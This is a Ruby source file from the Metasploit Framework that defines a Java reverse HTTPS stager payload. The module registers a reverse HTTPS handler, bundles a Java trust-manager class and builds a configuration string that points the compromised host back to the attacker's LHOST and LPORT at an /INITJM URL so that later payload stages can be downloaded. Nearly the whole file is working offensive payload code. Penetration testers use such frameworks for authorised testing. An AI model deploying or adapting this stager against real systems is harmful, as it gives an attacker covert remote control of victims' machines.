##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_https'

module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler

  include Msf::Payload::Stager
  include Msf::Payload::Java

  handler module_name: 'Msf::Handler::ReverseHttps'

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Java Reverse HTTPS Stager',
      'Description'   => 'Tunnel communication over HTTPS',
      'Author'        => [
          'mihi',  # all the hard work
          'egypt', # msf integration
          'hdm',   # windows/reverse_https
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'java',
      'Arch'          => ARCH_JAVA,
      'Convention'    => 'javaurl',
      'Stager'        => {'Payload' => ""}
      ))

    register_advanced_options(
      [
        Msf::OptInt.new('Spawn', [ true, "Number of subprocesses to spawn", 2 ])
      ], self.class
    )

    @class_files = [
      [ "metasploit", "PayloadTrustManager.class" ],
    ]
  end

  def config
    spawn = datastore["Spawn"] || 2
    c =  ""
    c << "Spawn=#{spawn}\n"
    c << "URL=https://#{datastore["LHOST"]}"
    c << ":#{datastore["LPORT"]}" if datastore["LPORT"]
    c << "/INITJM\n"

    c
  end

  #
  # Always wait at least 20 seconds for this payload (due to staging delays)
  #
  def wfs_delay
    20
  end
end
